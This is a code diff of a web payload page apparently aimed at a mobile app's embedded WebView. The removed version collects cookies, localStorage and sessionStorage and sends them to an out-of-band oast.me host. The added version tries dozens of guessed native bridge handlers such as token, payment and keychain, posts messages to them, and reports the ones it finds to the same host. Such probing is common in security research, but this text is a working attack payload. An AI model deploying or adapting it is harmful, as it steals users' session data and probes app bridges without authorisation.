@@ -1,40 +1,37 @@
-<html>
-  <head><title>Loading...</title></head>
-  <body>
-  <script>
-  var data = {
-    cookies: document.cookie,
-    url: window.location.href,
-    localStorage: {},
-    sessionStorage: {}
-  };
+<script>
+  var handlers = [
+    "plus", "plusSDK", "YandexPlus", "YaPlusSDK", "sdk",
+    "native", "nativeCall", "bridge", "app", "appBridge",
+    "smartWebview", "SmartWebview", "webview", "WebView",
+    "cookie", "cookieInject", "CookieInject",
+    "broadcast", "Broadcasting", "message", "messaging",
+    "contacts", "ContactsSelect", "contactsSelect",
+    "navigation", "navigate", "close", "back",
+    "payment", "pay", "fintech", "bank",
+    "auth", "token", "session", "getToken",
+    "device", "deviceInfo", "analytics", "log",
+    "storage", "keychain", "biometric",
+    "vibrate", "haptic",
+    "camera", "photo", "gallery",
+    "share", "clipboard",
+    "openURL", "openUrl", "deeplink"
+  ];
 
-  try {
-    for(var i=0;i<localStorage.length;i++){
-      var k=localStorage.key(i);
-      data.localStorage[k]=localStorage.getItem(k);
+  var found = [];
+  handlers.forEach(function(h){
+    try {
+      if(window.webkit.messageHandlers[h]){
+        found.push(h);
+        // Try to call it
+        window.webkit.messageHandlers[h].postMessage({action:"ping"});
+      }
+    } catch(e){
+      // If it throws TypeError "undefined" = doesn't exist
+      // If it throws anything ELSE = it EXISTS but rejected our message
+      if(e.name !== "TypeError") found.push(h + " (exists, error: " + e.message + ")");
     }
-  } catch(e){}
+  });
 
-  try {
-    for(var i=0;i<sessionStorage.length;i++){
-      var k=sessionStorage.key(i);
-      data.sessionStorage[k]=sessionStorage.getItem(k);
-    }
-  } catch(e){}
-
-  data.bridges = [];
-  try {
-    if(window.webkit && window.webkit.messageHandlers){
-      data.bridges.push("webkit.messageHandlers: " + Object.keys(window.webkit.messageHandlers));
-    }
-  } catch(e){}
-  if(window.YandexPlus) data.bridges.push("YandexPlus");
-  if(window.YaPlusSDK) data.bridges.push("YaPlusSDK");
-
-  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/exfil?" + encodeURIComponent(JSON.stringify(data)));
-
-  document.title = JSON.stringify(data);
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/bridges?" + encodeURIComponent(JSON.stringify(found)));
+  document.title = "Found: " + JSON.stringify(found);
   </script>
-  </body>
-  </html>
